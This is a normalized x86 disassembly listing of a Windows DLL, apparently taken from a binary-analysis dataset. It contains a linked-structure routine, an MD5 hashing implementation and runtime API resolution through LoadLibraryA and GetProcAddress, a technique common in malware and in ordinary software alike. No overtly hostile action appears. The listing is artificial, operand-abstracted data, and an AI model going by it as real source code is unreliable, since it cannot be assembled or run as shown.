test ecx ecx
jne r-xdata
cmp eax [ esi + 0x38 ]
jb r-xdata
cmp [ esi + 0x30 ] 0xffffffff
jne r-xdata
push eax
call sub_10009e3d
add esp 0x4
mov eax [ eax + edx * 4 + 0x4 ]
push eax
call sub_10009e3d
mov ecx [ esi + 0x48 ]
mov edx [ ecx + ebx ]
push edx
call sub_10009e3d
mov ecx [ esi + 0x48 ]
add edi 0x4
add esp 0x8
mov ebx edi
mov eax [ edi + ecx ]
test eax eax
jne r-xdata
mov eax [ edi + ecx ]
mov ebx edi
lea ecx [ eax + 0x4 ]
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
add esp 0x4
cmp eax [ esi + 0x3c ]
jbe r-xdata
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_10009e3d
add esp 0x4
mov ebp [ eax + 0x4 ]
mov edx 0x1
test ebp ebp
je r-xdata
mov ebp [ ecx + 0x4 ]
add ecx 0x4
inc edx
test ebp ebp
jne r-xdata
push eax
call sub_10009e3d
add esp 0x4
sub_10003340
push ebx
push esi
push edi
push 0xd0
call sub_100096ed
mov edi eax
xor eax eax
mov ebx edi
mov ecx 0x34
[ edi ]
mov eax [ esp + 0x14 ]
mov edi rw-data
mov [ ebx ] eax
or ecx 0xffffffff
xor eax eax
mov [ ebx + 0x28 ] ebx
mov [ ebx + 0x8 ] edi
lea edx [ ebx + 0x4e ]
[ edi ]
not ecx
sub edi ecx
push 0x2c
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_100096ed
mov ecx 0xb
mov esi rw-data
mov edi eax
add esp 0x8
[ edi ] [ esi ]
mov [ ebx + 0x40 ] eax
mov eax rw-data
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x44 ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_100033c0
mov ecx [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0x18 ]
xor ebx ebx
mov [ ebp + 0xc ] esi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0x20 ] ecx
mov eax [ ecx + 0x1c ]
push edi
cmp eax ebx
je r-xdata
mov [ ecx + 0x1c ] ebp
cmp [ eax + 0xc ] esi
ja r-xdata
mov [ ebp + 0x18 ] eax
mov [ ecx + 0x1c ] ebp
mov ecx [ eax + 0x18 ]
mov edx eax
cmp ecx ebx
je r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov ecx [ edx + 0x18 ]
mov [ ebp + 0x18 ] ecx
mov [ edx + 0x18 ] ebp
jmp r-xdata
cmp [ ecx + 0xc ] esi
ja r-xdata
test edi edi
je r-xdata
mov [ esp + 0x14 ] edi
mov edi [ edi + 0x14 ]
test edi edi
jne r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
mov dl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov edi eax
mov [ esp + 0x14 ] ebx
mov edx ecx
mov ecx [ edx + 0x18 ]
cmp ecx ebx
jne r-xdata
mov esi [ esp + 0x1c ]
mov esi [ esp + 0x1c ]
mov ecx [ edi + 0xc ]
cmp ecx esi
ja r-xdata
mov esi [ ebp ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov [ ebp + 0x10 ] edi
mov ecx eax
xor edx edx
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov ecx [ edi + 0x10 ]
test ecx ecx
je r-xdata
mov bl [ ecx ]
mov dl bl
cmp bl [ esi ]
jne r-xdata
test edx edx
mov [ ebp + 0x14 ] ecx
je r-xdata
mov edx ecx
mov ecx [ ecx + 0x14 ]
test ecx ecx
jne r-xdata
mov edx [ edi + 0x14 ]
mov [ ecx + 0x14 ] edx
mov edx [ edi + 0x10 ]
mov eax ebp
mov [ ebp + 0x10 ] edx
mov [ edi + 0x10 ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ ecx + 0xc ] esi
ja r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
pop edi
mov [ edx + 0x14 ] ebp
mov eax ebp
pop esi
pop ebp
pop ebx
retn
cmp [ ecx + 0xc ] esi
ja r-xdata
mov edi ecx
mov ecx [ edi + 0x10 ]
test ecx ecx
jne r-xdata
sub_100034e0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
push 0x28
call sub_100096ed
mov edi eax
xor eax eax
mov edx edi
mov ecx 0xa
[ edi ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push ecx
push esi
push edx
mov [ edx ] eax
mov [ edx + 0x4 ] rw-data
mov [ edx + 0x8 ] rw-data
call sub_100033c0
add esp 0x10
pop edi
pop esi
retn
xor eax eax
pop esi
retn
sub_10003550
sub esp 0x4c
push ebx
push ebp
push esi
mov esi ecx
mov ecx [ esp + 0x5c ]
lea edx [ esp + 0x18 ]
mov ebx [ esi + 0x94 ]
mov ebp [ esi + 0x98 ]
mov [ esp + 0x5c ] edx
mov edx 0xfffffffe
sub edx ecx
push edi
mov edi [ esi + 0x90 ]
lea eax [ ecx + 0x2 ]
mov [ esp + 0x18 ] edx
xor edx edx
xor ecx ecx
mov dh [ eax + 0x1 ]
mov cl [ eax - 0x1 ]
mov dl [ eax ]
add eax 0x4
shl edx 0x8
or edx ecx
xor ecx ecx
mov cl [ eax - 0x6 ]
shl edx 0x8
or edx ecx
mov ecx [ esp + 0x60 ]
mov [ ecx ] edx
mov edx [ esp + 0x18 ]
add edx eax
add ecx 0x4
cmp edx 0x40
mov [ esp + 0x60 ] ecx
jb r-xdata
mov eax edi
mov ecx ebx
not eax
and eax ebp
and ecx edi
or eax ecx
mov ecx [ esp + 0x1c ]
add eax ecx
mov ecx [ esi + 0x8c ]
lea ecx [ ecx + eax - 0x28955b88 ]
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
mov ecx edi
add eax edi
mov edx eax
and ecx eax
not edx
and edx ebx
or edx ecx
mov ecx [ esp + 0x20 ]
add edx ecx
lea edx [ edx + ebp - 0x173848aa ]
mov ecx edx
shr ecx 0x14
shl edx 0xc
or ecx edx
add ecx eax
mov edx ecx
mov ebp ecx
not edx
and edx edi
and ebp eax
or edx ebp
mov ebp [ esp + 0x24 ]
add edx ebp
mov ebp ecx
lea ebx [ ebx + edx + 0x242070db ]
mov edx ebx
shr edx 0xf
shl ebx 0x11
or edx ebx
add edx ecx
mov ebx edx
and ebp edx
not ebx
and ebx eax
or ebx ebp
mov ebp [ esp + 0x28 ]
add ebx ebp
lea ebx [ edi + ebx - 0x3e423112 ]
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
mov ebx edx
add edi edx
mov [ esp + 0x10 ] edi
mov ebp [ esp + 0x10 ]
not edi
and edi ecx
and ebx ebp
mov ebp [ esp + 0x2c ]
or edi ebx
add edi ebp
mov ebx [ esp + 0x10 ]
mov ebp ebx
lea eax [ eax + edi - 0xa83f051 ]
mov edi eax
shr edi 0x19
shl eax 0x7
or edi eax
add edi ebx
mov eax edi
and ebp edi
not eax
and eax edx
or eax ebp
mov ebp [ esp + 0x30 ]
add eax ebp
lea ecx [ ecx + eax + 0x4787c62a ]
mov eax ecx
shr eax 0x14
shl ecx 0xc
or eax ecx
add eax edi
mov ecx eax
mov ebp eax
not ecx
and ecx ebx
and ebp edi
or ecx ebp
mov ebp [ esp + 0x34 ]
add ecx ebp
mov ebp eax
lea edx [ edx + ecx - 0x57cfb9ed ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
add ecx eax
mov edx ecx
and ebp ecx
not edx
and edx edi
or edx ebp
mov ebp [ esp + 0x38 ]
add edx ebp
lea ebx [ ebx + edx - 0x2b96aff ]
mov edx ebx
shl edx 0x16
shr ebx 0xa
or edx ebx
mov ebx ecx
add edx ecx
mov [ esp + 0x10 ] edx
mov ebp [ esp + 0x10 ]
not edx
and edx eax
and ebx ebp
mov ebp [ esp + 0x3c ]
or edx ebx
add edx ebp
mov ebx [ esp + 0x10 ]
mov ebp ebx
lea edi [ edi + edx + 0x698098d8 ]
mov edx edi
shr edx 0x19
shl edi 0x7
or edx edi
add edx ebx
mov edi edx
and ebp edx
not edi
and edi ecx
or edi ebp
mov ebp [ esp + 0x40 ]
add edi ebp
lea eax [ eax + edi - 0x74bb0851 ]
mov edi eax
shr edi 0x14
shl eax 0xc
or edi eax
add edi edx
mov eax edi
mov ebp edi
not eax
and eax ebx
and ebp edx
or eax ebp
mov ebp [ esp + 0x44 ]
add eax ebp
lea ecx [ ecx + eax - 0xa44f ]
mov eax ecx
shr eax 0xf
shl ecx 0x11
or eax ecx
add eax edi
mov ecx eax
not ecx
and ecx edx
mov ebp edi
and ebp eax
or ecx ebp
mov ebp [ esp + 0x48 ]
add ecx ebp
lea ebx [ ebx + ecx - 0x76a32842 ]
mov ecx ebx
shl ecx 0x16
shr ebx 0xa
or ecx ebx
mov ebx eax
add ecx eax
mov [ esp + 0x10 ] ecx
mov ebp [ esp + 0x10 ]
not ecx
and ecx edi
and ebx ebp
mov ebp [ esp + 0x4c ]
or ecx ebx
add ecx ebp
mov ebp [ esp + 0x10 ]
mov ebx ebp
lea edx [ edx + ecx + 0x6b901122 ]
mov ecx edx
shr ecx 0x19
shl edx 0x7
or ecx edx
add ecx ebp
mov edx ecx
and ebx ecx
not edx
and edx eax
or edx ebx
mov ebx [ esp + 0x50 ]
add edx ebx
lea edi [ edi + edx - 0x2678e6d ]
mov edx edi
shr edx 0x14
shl edi 0xc
or edx edi
add edx ecx
mov ebx edx
not ebx
mov edi ebx
and edi ebp
mov ebp edx
and ebp ecx
or edi ebp
mov ebp [ esp + 0x54 ]
add edi ebp
mov ebp edx
lea eax [ eax + edi - 0x5986bc72 ]
mov edi eax
shr edi 0xf
shl eax 0x11
or edi eax
add edi edx
mov eax edi
and ebp edi
not eax
mov [ esp + 0x60 ] eax
and eax ecx
or eax ebp
mov ebp [ esp + 0x58 ]
add eax ebp
mov ebp [ esp + 0x10 ]
and ebx edi
lea ebp [ eax + ebp + 0x49b40821 ]
mov eax ebp
shl eax 0x16
shr ebp 0xa
or eax ebp
mov ebp edx
add eax edi
and ebp eax
or ebx ebp
mov ebp [ esp + 0x20 ]
add ebx ebp
lea ecx [ ecx + ebx - 0x9e1da9e ]
mov ebx ecx
shr ebx 0x1b
shl ecx 0x5
or ebx ecx
mov ecx [ esp + 0x60 ]
add ebx eax
mov ebp edi
and ecx eax
and ebp ebx
or ecx ebp
mov ebp [ esp + 0x34 ]
add ecx ebp
lea edx [ edx + ecx - 0x3fbf4cc0 ]
mov ecx edx
shr ecx 0x17
shl edx 0x9
or ecx edx
mov edx eax
add ecx ebx
not edx
mov ebp ecx
and edx ebx
and ebp eax
or edx ebp
mov ebp [ esp + 0x48 ]
add edx ebp
lea edi [ edi + edx + 0x265e5a51 ]
mov edx edi
shr edx 0x12
shl edi 0xe
or edx edi
mov edi ebx
add edx ecx
not edi
mov ebp edx
and edi ecx
and ebp ebx
or edi ebp
mov ebp [ esp + 0x1c ]
add edi ebp
mov ebp ecx
lea eax [ eax + edi - 0x16493856 ]
mov edi eax
shl edi 0x14
shr eax 0xc
or edi eax
mov eax ecx
add edi edx
not eax
and eax edx
and ebp edi
or eax ebp
mov ebp [ esp + 0x30 ]
add eax ebp
lea ebx [ ebx + eax - 0x29d0efa3 ]
mov eax ebx
shr eax 0x1b
shl ebx 0x5
or eax ebx
mov ebx edx
add eax edi
mov [ esp + 0x60 ] eax
mov ebp [ esp + 0x60 ]
mov eax edx
and ebx ebp
mov ebp [ esp + 0x44 ]
not eax
and eax edi
or eax ebx
mov ebx [ esp + 0x60 ]
add eax ebp
lea ecx [ ecx + eax + 0x2441453 ]
mov eax ecx
shr eax 0x17
shl ecx 0x9
or eax ecx
mov ecx edi
add eax ebx
not ecx
mov ebp eax
and ecx ebx
and ebp edi
or ecx ebp
mov ebp [ esp + 0x58 ]
add ecx ebp
mov ebp [ esp + 0x60 ]
not ebx
lea edx [ edx + ecx - 0x275e197f ]
and ebx eax
mov ecx edx
shr ecx 0x12
shl edx 0xe
or ecx edx
add ecx eax
mov edx ecx
and edx ebp
mov ebp [ esp + 0x2c ]
or ebx edx
add ebx ebp
lea edi [ edi + ebx - 0x182c0438 ]
mov ebx eax
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi eax
add edx ecx
not edi
and edi ecx
and ebx edx
or edi ebx
mov ebx [ esp + 0x40 ]
add edi ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + edi + 0x21e1cde6 ]
mov edi ebx
shr edi 0x1b
shl ebx 0x5
or edi ebx
mov ebx ecx
add edi edx
mov [ esp + 0x60 ] edi
mov ebp [ esp + 0x60 ]
mov edi ecx
and ebx ebp
mov ebp [ esp + 0x54 ]
not edi
and edi edx
or edi ebx
mov ebx [ esp + 0x60 ]
add edi ebp
lea eax [ eax + edi - 0x3cc8f82a ]
mov edi eax
shr edi 0x17
shl eax 0x9
or edi eax
mov eax edx
add edi ebx
not eax
mov ebp edi
and eax ebx
and ebp edx
or eax ebp
mov ebp [ esp + 0x28 ]
add eax ebp
mov ebp [ esp + 0x60 ]
not ebx
lea ecx [ ecx + eax - 0xb2af279 ]
and ebx edi
mov eax ecx
shr eax 0x12
shl ecx 0xe
or eax ecx
add eax edi
mov ecx eax
and ecx ebp
mov ebp [ esp + 0x3c ]
or ebx ecx
add ebx ebp
lea edx [ edx + ebx + 0x455a14ed ]
mov ecx edx
shl ecx 0x14
shr edx 0xc
or ecx edx
mov edx edi
add ecx eax
not edx
mov ebx edi
and edx eax
and ebx ecx
or edx ebx
mov ebx [ esp + 0x50 ]
add edx ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + edx - 0x561c16fb ]
mov edx ebx
shr edx 0x1b
shl ebx 0x5
or edx ebx
mov ebx eax
add edx ecx
mov [ esp + 0x60 ] edx
mov ebp [ esp + 0x60 ]
mov edx eax
and ebx ebp
mov ebp [ esp + 0x24 ]
not edx
and edx ecx
or edx ebx
mov ebx [ esp + 0x60 ]
add edx ebp
lea edi [ edi + edx - 0x3105c08 ]
mov edx edi
shr edx 0x17
shl edi 0x9
or edx edi
mov edi ecx
add edx ebx
not edi
mov ebp edx
and edi ebx
and ebp ecx
or edi ebp
mov ebp [ esp + 0x38 ]
add edi ebp
mov ebp [ esp + 0x60 ]
not ebx
lea eax [ eax + edi + 0x676f02d9 ]
and ebx edx
mov edi eax
shr edi 0x12
shl eax 0xe
or edi eax
add edi edx
mov eax edi
and eax ebp
mov ebp [ esp + 0x4c ]
or ebx eax
add ebx ebp
mov ebp [ esp + 0x3c ]
lea ecx [ ecx + ebx - 0x72d5b376 ]
mov ebx [ esp + 0x30 ]
mov eax ecx
shl eax 0x14
shr ecx 0xc
or eax ecx
mov ecx edx
add eax edi
xor ecx edi
xor ecx eax
add ecx ebx
mov ebx [ esp + 0x60 ]
lea ebx [ ebx + ecx - 0x5c6be ]
mov ecx ebx
shr ecx 0x1c
shl ebx 0x4
or ecx ebx
mov ebx edi
add ecx eax
xor ebx eax
xor ebx ecx
add ebx ebp
lea edx [ edx + ebx - 0x788e097f ]
mov ebx edx
shr ebx 0x15
shl edx 0xb
or ebx edx
mov ebp [ esp + 0x48 ]
add ebx ecx
mov edx ebx
xor edx eax
xor edx ecx
add edx ebp
mov ebp [ esp + 0x54 ]
lea edx [ edi + edx + 0x6d9d6122 ]
mov edi edx
shr edi 0x10
shl edx 0x10
or edi edx
mov edx ebx
add edi ebx
xor edx edi
mov [ esp + 0x60 ] edx
xor edx ecx
add edx ebp
mov ebp [ esp + 0x20 ]
lea eax [ eax + edx - 0x21ac7f4 ]
mov edx eax
shl edx 0x17
shr eax 0x9
or edx eax
mov eax [ esp + 0x60 ]
add edx edi
xor eax edx
add eax ebp
mov ebp [ esp + 0x2c ]
lea ecx [ ecx + eax - 0x5b4115bc ]
mov eax ecx
shr eax 0x1c
shl ecx 0x4
or eax ecx
mov ecx edi
add eax edx
xor ecx edx
xor ecx eax
add ecx ebp
mov ebp [ esp + 0x38 ]
lea ecx [ ebx + ecx + 0x4bdecfa9 ]
mov ebx ecx
shr ebx 0x15
shl ecx 0xb
or ebx ecx
add ebx eax
mov ecx ebx
xor ecx edx
xor ecx eax
add ecx ebp
mov ebp [ esp + 0x44 ]
lea ecx [ edi + ecx - 0x944b4a0 ]
mov edi ecx
shr edi 0x10
shl ecx 0x10
or edi ecx
mov ecx ebx
add edi ebx
xor ecx edi
mov [ esp + 0x60 ] ecx
xor ecx eax
add ecx ebp
mov ebp [ esp + 0x50 ]
lea edx [ edx + ecx - 0x41404390 ]
mov ecx edx
shl ecx 0x17
shr edx 0x9
or ecx edx
mov edx [ esp + 0x60 ]
add ecx edi
xor edx ecx
add edx ebp
lea edx [ eax + edx + 0x289b7ec6 ]
mov eax edx
shr eax 0x1c
shl edx 0x4
or eax edx
mov edx edi
add eax ecx
mov ebp [ esp + 0x1c ]
xor edx ecx
xor edx eax
add edx ebp
mov ebp [ esp + 0x28 ]
lea edx [ ebx + edx - 0x155ed806 ]
mov ebx edx
shr ebx 0x15
shl edx 0xb
or ebx edx
add ebx eax
mov edx ebx
xor edx ecx
xor edx eax
add edx ebp
mov ebp [ esp + 0x34 ]
lea edx [ edi + edx - 0x2b10cf7b ]
mov edi edx
shr edi 0x10
shl edx 0x10
or edi edx
mov edx ebx
add edi ebx
xor edx edi
mov [ esp + 0x60 ] edx
xor edx eax
add edx ebp
mov ebp [ esp + 0x40 ]
lea edx [ ecx + edx + 0x4881d05 ]
mov ecx edx
shl ecx 0x17
shr edx 0x9
or ecx edx
mov edx [ esp + 0x60 ]
add ecx edi
xor edx ecx
add edx ebp
mov ebp [ esp + 0x4c ]
lea eax [ eax + edx - 0x262b2fc7 ]
mov edx eax
shr edx 0x1c
shl eax 0x4
or edx eax
mov eax edi
add edx ecx
xor eax ecx
xor eax edx
add eax ebp
mov ebp [ esp + 0x58 ]
lea ebx [ ebx + eax - 0x1924661b ]
mov eax ebx
shr eax 0x15
shl ebx 0xb
or eax ebx
add eax edx
mov ebx eax
mov [ esp + 0x14 ] eax
xor ebx ecx
xor ebx edx
add ebx ebp
lea edi [ edi + ebx + 0x1fa27cf8 ]
mov ebx edi
shr ebx 0x10
shl edi 0x10
or ebx edi
mov edi eax
add ebx eax
xor edi ebx
mov [ esp + 0x18 ] ebx
xor edi edx
add edi [ esp + 0x24 ]
not eax
lea ecx [ ecx + edi - 0x3b53a99b ]
mov edi ecx
shl edi 0x17
shr ecx 0x9
or edi ecx
add edi ebx
or eax edi
mov [ esp + 0x10 ] edi
xor eax ebx
mov ecx [ esp + 0x1c ]
push 0x432aff97
add eax ecx
push 0xa
lea eax [ edx + eax - 0xbd6ddbc ]
mov edx [ esp + 0x40 ]
mov ecx eax
push edx
shr ecx 0x1a
shl eax 0x6
or ecx eax
push ebx
add ecx edi
push edi
lea eax [ esp + 0x28 ]
mov [ esp + 0x74 ] ecx
push ecx
push eax
mov ecx esi
call sub_10003f70
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x60 ]
push 0xab9423a7
push 0xf
push ecx
mov ecx [ esp + 0x20 ]
push edx
push eax
lea edx [ esp + 0x2c ]
push ecx
push edx
mov ecx esi
call sub_10003f70
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x60 ]
mov edx [ esp + 0x14 ]
push 0xfc93a039
push 0x15
push eax
mov eax [ esp + 0x24 ]
push ecx
push edx
lea ecx [ esp + 0x24 ]
push eax
push ecx
mov ecx esi
call sub_10003f70
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push 0x655b59c3
push 0x6
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
lea eax [ esp + 0x74 ]
push edx
push eax
mov ecx esi
call sub_10003f70
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
push 0x8f0ccc92
push 0xa
push ecx
mov ecx [ esp + 0x6c ]
push edx
push eax
lea edx [ esp + 0x28 ]
push ecx
push edx
mov ecx esi
call sub_10003f70
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x10 ]
push 0xffeff47d
push 0xf
push eax
mov edx [ esp + 0x6c ]
mov eax [ esp + 0x20 ]
push ecx
push edx
lea ecx [ esp + 0x2c ]
push eax
push ecx
mov ecx esi
call sub_10003f70
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x14 ]
push 0x85845dd1
push 0x15
push edx
mov edx [ esp + 0x24 ]
push eax
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
mov ecx esi
call sub_10003f70
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
push 0x6fa87e4f
push 0x6
push ecx
mov ecx [ esp + 0x1c ]
push edx
push eax
lea edx [ esp + 0x74 ]
push ecx
push edx
mov ecx esi
call sub_10003f70
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x60 ]
push 0xfe2ce6e0
push 0xa
push ebp
push eax
push ecx
lea eax [ esp + 0x28 ]
push edx
push eax
mov ecx esi
call sub_10003f70
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x60 ]
push 0xa3014314
push 0xf
push ecx
mov ecx [ esp + 0x20 ]
push edx
push eax
lea edx [ esp + 0x2c ]
push ecx
push edx
mov ecx esi
call sub_10003f70
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x60 ]
mov edx [ esp + 0x14 ]
push 0x4e0811a1
push 0x15
push eax
mov eax [ esp + 0x24 ]
push ecx
push edx
lea ecx [ esp + 0x24 ]
push eax
push ecx
mov ecx esi
call sub_10003f70
mov edx [ esp + 0x2c ]
push 0xf7537e82
push 0x6
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x1c ]
push eax
push ecx
lea eax [ esp + 0x74 ]
push edx
push eax
mov ecx esi
call sub_10003f70
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
push 0xbd3af235
push 0xa
push ecx
mov ecx [ esp + 0x6c ]
push edx
push eax
lea edx [ esp + 0x28 ]
push ecx
push edx
mov ecx esi
call sub_10003f70
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x60 ]
push 0x2ad7d2bb
push 0xf
push eax
mov eax [ esp + 0x20 ]
push ecx
push edx
lea ecx [ esp + 0x2c ]
push eax
push ecx
mov ecx esi
call sub_10003f70
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x14 ]
push 0xeb86d391
push 0x15
push edx
mov edx [ esp + 0x24 ]
push eax
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
mov ecx esi
call sub_10003f70
mov ecx [ esp + 0x60 ]
mov ebx [ esi + 0x8c ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov edi [ esi + 0x90 ]
add ebx ecx
mov ecx [ esi + 0x94 ]
add edi edx
add ecx eax
mov eax [ esi + 0x98 ]
mov [ esi + 0x94 ] ecx
mov ecx [ esp + 0x14 ]
add eax ecx
mov [ esi + 0x90 ] edi
mov [ esi + 0x8c ] ebx
mov [ esi + 0x98 ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4c
retn 0x4
sub_10003f70
mov eax [ esp + 0x10 ]
push ebx
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0x20 ]
push esi
mov esi [ esp + 0x10 ]
not eax
or eax esi
push edi
mov edi [ esp + 0x20 ]
xor eax ebx
add eax edi
mov edi [ esp + 0x24 ]
add eax edx
mov edx [ esp + 0x10 ]
mov ecx [ edx ]
add ecx eax
mov [ edx ] ecx
mov eax ecx
mov ecx 0x20
mov ebx eax
sub ecx edi
shr ebx cl
mov ecx edi
pop edi
shl eax cl
or ebx eax
add ebx esi
pop esi
mov [ edx ] ebx
pop ebx
retn 0x1c
sub_10003ff0
mov edx ecx
push edi
mov ecx 0x10
xor eax eax
lea edi [ edx + 0x44 ]
mov [ edx ] r--data
[ edi ]
mov [ edx + 0x88 ] eax
mov [ edx + 0x84 ] eax
mov [ edx + 0x8c ] 0x67452301
mov [ edx + 0x90 ] 0xefcdab89
mov [ edx + 0x94 ] 0x98badcfe
mov [ edx + 0x98 ] 0x10325476
mov eax edx
pop edi
retn
sub_10004040
sub esp 0x1c
push ebx
push ebp
push esi
push edi
mov edi ecx
xor esi esi
lea ebp [ edi + 0x84 ]
mov ecx ebp
mov al [ ecx ]
add ecx 0x4
mov [ esp + esi + 0x14 ] al
mov eax [ ecx - 0x4 ]
mov edx eax
add esi 0x4
shr edx 0x8
mov [ esp + esi + 0x11 ] dl
mov edx eax
shr edx 0x10
shr eax 0x18
mov [ esp + esi + 0x12 ] dl
mov [ esp + esi + 0x13 ] al
cmp esi 0x8
jb r-xdata
mov ecx [ ebp ]
mov eax 0x38
shr ecx 0x3
and ecx 0x3f
cmp ecx 0x38
jb r-xdata
sub eax ecx
mov ecx edi
push eax
push rw-data
call sub_10004130
lea eax [ esp + 0x14 ]
push 0x8
push eax
mov ecx edi
call sub_10004130
lea ecx [ edi + 0x8c ]
xor esi esi
mov eax 0x78
mov dl [ ecx ]
mov eax [ ecx ]
mov [ esp + esi + 0x1c ] dl
mov edx eax
shr edx 0x8
mov [ esp + esi + 0x1d ] dl
mov edx eax
shr edx 0x10
shr eax 0x18
mov [ esp + esi + 0x1e ] dl
mov [ esp + esi + 0x1f ] al
add esi 0x4
add ecx 0x4
cmp esi 0x10
jb r-xdata
mov ebx [ lstrcatA@IAT ]
add edi 0x4
xor esi esi
mov [ edi ] 0x0
xor eax eax
lea ecx [ esp + 0x10 ]
mov al [ esp + esi + 0x1c ]
push eax
push rw-data
push ecx
call sub_1000a135
add esp 0xc
lea edx [ esp + 0x10 ]
push edx
push edi
call ebx
inc esi
cmp esi 0x10
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
sub_10004130
push ebx
mov ebx ecx
mov ecx [ esp + 0xc ]
push ebp
mov edx [ ebx + 0x84 ]
push esi
mov eax edx
lea esi [ ecx * 8 ]
shr eax 0x3
lea edx [ edx + ecx * 8 ]
and eax 0x3f
cmp edx esi
push edi
mov [ ebx + 0x84 ] edx
jae r-xdata
mov edi [ ebx + 0x88 ]
mov edx ecx
mov ebp 0x40
shr edx 0x1d
sub ebp eax
add edi edx
cmp ecx ebp
mov [ ebx + 0x88 ] edi
jb r-xdata
inc [ ebx + 0x88 ]
xor edi edi
mov esi [ esp + 0x14 ]
mov ecx ebp
lea edi [ eax + ebx + 0x44 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x44 ]
push ecx
mov ecx ebx
call sub_10003550
mov edi ebp
lea esi [ ebp + 0x3f ]
mov ebp [ esp + 0x18 ]
cmp esi ebp
jae r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx ebx
lea eax [ edx + esi - 0x3f ]
push eax
call sub_10003550
add esi 0x40
add edi 0x40
cmp esi ebp
jb r-xdata
mov edx [ esp + 0x14 ]
sub ecx edi
lea esi [ edi + edx ]
lea edi [ eax + ebx + 0x44 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_10004200
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_1001182b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x9c
push esi
push edi
mov edi [ esp + 0xb4 ]
test edi edi
je r-xdata
mov ecx [ esp + 0xa4 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xa8
retn
mov esi [ esp + 0xbc ]
test esi esi
je r-xdata
lea ecx [ esp + 0x8 ]
call sub_10003ff0
mov eax [ esp + 0xb8 ]
lea ecx [ esp + 0x8 ]
push eax
push edi
mov [ esp + 0xb4 ] 0x0
call sub_10004130
lea ecx [ esp + 0x8 ]
call sub_10004040
mov ecx [ esp + 0x94 ]
mov edx [ esp + 0x98 ]
mov eax [ esp + 0x9c ]
mov [ esi ] ecx
mov ecx [ esp + 0xa0 ]
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ecx
sub_100042a0
push ebx
mov ebx [ LoadLibraryA@IAT ]
push esi
push edi
push rw-data
call ebx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
